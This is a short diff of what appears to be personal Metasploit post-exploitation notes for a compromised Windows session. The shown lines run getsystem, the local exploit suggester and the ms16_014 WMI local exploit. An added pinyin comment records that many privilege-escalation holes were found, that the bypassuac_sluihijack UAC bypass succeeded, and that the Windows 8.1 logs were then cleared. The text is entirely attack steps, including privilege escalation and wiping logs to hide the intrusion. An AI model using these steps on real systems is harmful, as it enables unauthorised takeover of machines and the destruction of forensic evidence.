@@ -71,7 +71,7 @@ getsystem
 use post/multi/recon/local_exploit_suggester
 set SESSION 1
 show options
-run
+run                                    limian xianshile haoduozhong qiquanloudong   zuihouyong  exploit/windows/local/bypassuac_sluihijack  chenggong qingchu win8.1rizhi 
 use exploit/windows/local/ms16_014_wmi_recv_notif
 set SESSION 1
 show options
